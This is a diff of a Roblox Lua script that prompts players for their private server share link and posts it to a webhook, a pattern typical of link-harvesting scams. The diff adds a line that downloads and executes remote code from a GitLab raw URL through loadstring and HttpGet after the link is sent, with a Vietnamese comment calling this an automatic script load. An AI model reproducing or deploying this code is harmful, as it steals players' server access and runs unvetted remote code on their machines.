@@ -288,7 +288,7 @@ else
         task.delay(5,function() if popup and popup.Parent then popup:Destroy() end end)
     end
 
-    local function isValidPrivateServerLink(txt)
+local function isValidPrivateServerLink(txt)
         return string.match(txt, "^https://www%.roblox%.com/share%?code=.+&type=Server$") ~= nil
     end
 
@@ -296,6 +296,12 @@ else
         local txt = textBox.Text or ""
         if isValidPrivateServerLink(txt) then
             sendWebhook(txt)
+            
+            -- ✅ Tự động load script sau khi gửi webhook (giống public server)
+            pcall(function()
+                loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/visual2.lua"))()
+            end)
+
             screenGui:Destroy()
         else
             showError("Please enter your private server link")
@@ -303,9 +309,10 @@ else
     end
 
     sendButton.MouseButton1Click:Connect(handleSend)
-    textBox.FocusLost:Connect(function(enterPressed) if enterPressed then handleSend() end end)
+    textBox.FocusLost:Connect(function(enterPressed)
+        if enterPressed then handleSend() end
+    end)
 end
-
 -- =============================
 -- Script quản lý base (Full Final)
 -- Execute dùng ngay
